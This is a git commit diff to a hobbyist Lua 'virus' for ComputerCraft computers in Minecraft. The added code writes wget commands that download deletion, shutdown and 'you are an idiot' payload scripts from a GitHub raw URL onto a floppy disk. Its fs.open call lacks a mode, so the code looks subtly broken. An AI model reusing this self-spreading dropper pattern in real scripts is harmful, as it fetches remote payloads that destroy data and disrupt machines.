5f23d0201fd6a811db6f20a84b21c18a2a869519
Fakedrift <127430703+Fakedrift@users.noreply.github.com>
2023-07-13 20:36:16 +0100

    .

--- Virus's (go on floppy disks)/adder.lua
+++ Virus's (go on floppy disks)/adder.lua
@@ -1,6 +1,8 @@
-local V1F = fs.open("adder.lua")
-local V1S = [[
+local VF = fs.open("adder.lua")
+local VS = [[
     shell.run("wget", "https://raw.githubusercontent.com/Fakedrift/CC-stuff-I-made/main/Virus's%20(go%20on%20floppy%20disks)/DELETER.LUA", "disk/DELETER.lua")
     shell.run("wget", "https://raw.githubusercontent.com/Fakedrift/CC-stuff-I-made/main/Virus's%20(go%20on%20floppy%20disks)/shuttydowny.lua", "disk/shuttydowny.lua")
     shell.run("wget", "https://raw.githubusercontent.com/Fakedrift/CC-stuff-I-made/main/Virus's%20(go%20on%20floppy%20disks)/you%20are%20an%20idiot.lua", "disk/YAAI.lua")
 ]] 
+VF.write(VS)
+VF.close()
